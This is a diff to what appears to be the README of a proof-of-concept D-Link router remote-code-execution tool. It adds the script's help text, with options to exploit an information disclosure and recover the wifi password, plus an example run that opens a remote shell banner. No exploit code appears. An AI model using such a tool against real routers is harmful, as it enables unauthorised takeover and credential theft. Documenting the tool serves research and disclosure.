@@ -13,6 +13,22 @@ Works with:
 
 ## Example ##
 ```
+root@kali:~# ./dlink_shell_poc.py -h
+usage: dlink_shell_poc.py [-h] [-p PASSWORD] -u URL [-x]
+
+D-Link Service.cgi RCE
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -p PASSWORD, --password PASSWORD
+                        Password for the router. If not supplied then will use
+                        blank password.
+  -u URL, --url URL     [Required] URL for router (i.e. http://10.1.1.1:8080)
+  -x, --attempt-exploit
+                        If flag is set, will attempt CWE-200. If that fails,
+                        then will attempt to discover wifi password and use
+                        it.
+
 root@kali:~# ./dlink_shell_poc.py -u http://10.0.0.1:8080
 +--------------------------------------------------------------------------------+
 | Welcome to D-Link Shell                                                        |
